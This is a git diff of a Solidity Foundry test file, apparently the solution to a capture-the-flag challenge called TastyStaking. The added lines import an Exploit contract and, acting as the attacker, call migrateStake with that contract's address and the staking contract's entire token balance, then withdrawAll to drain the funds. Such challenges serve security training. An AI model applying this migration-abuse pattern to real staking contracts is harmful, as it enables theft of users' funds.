@@ -7,6 +7,7 @@ import {console} from "forge-std/console.sol";
 // core contracts
 import {Token} from "src/other/Token.sol";
 import {TastyStaking} from "src/tasty-stake/TastyStaking.sol";
+import {Exploit} from "src/tasty-stake/Exploit.sol";
 
 
 contract Testing is Test {
@@ -75,6 +76,11 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
         
         // implement solution here
+        Exploit exp = new Exploit();
+        uint256 amount = steak.balanceOf(address(tastyStaking));
+        tastyStaking.migrateStake(address(exp), amount);
+        tastyStaking.withdrawAll(false);
+        emit log_named_decimal_uint("steak bal:", steak.balanceOf(attacker), 18);
 
         vm.stopPrank();
         validation();
